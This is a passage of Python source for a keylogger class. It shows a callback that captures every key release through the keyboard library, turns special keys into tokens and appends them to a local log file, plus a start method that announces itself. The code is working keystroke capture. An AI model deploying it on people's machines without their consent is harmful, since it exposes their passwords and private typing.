    def callback(self, event):
        """This function is called every time a keyboard event is detected"""
        name = event.name
        if len(name) > 1:  # Special keys (like space, enter, etc.)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "backspace":
                name = "[BACKSPACE]"
            elif name == "tab":
                name = "[TAB]"
            elif name == "esc":
                name = "[ESC]"
            elif name == "ctrl" or name == "alt" or name == "shift":
                return  # Ignore modifier keys
            else:
                name = f"[{name.upper()}]"

        # Write to log file
        with open(self.log_file, "a") as f:
            f.write(name)

    def start(self):
        """Start the keylogger"""
        keyboard.on_release(callback=self.callback)
        print(f"Keylogger started. Logging to {self.log_file}")
        print("Press ESC to stop the keylogger...")

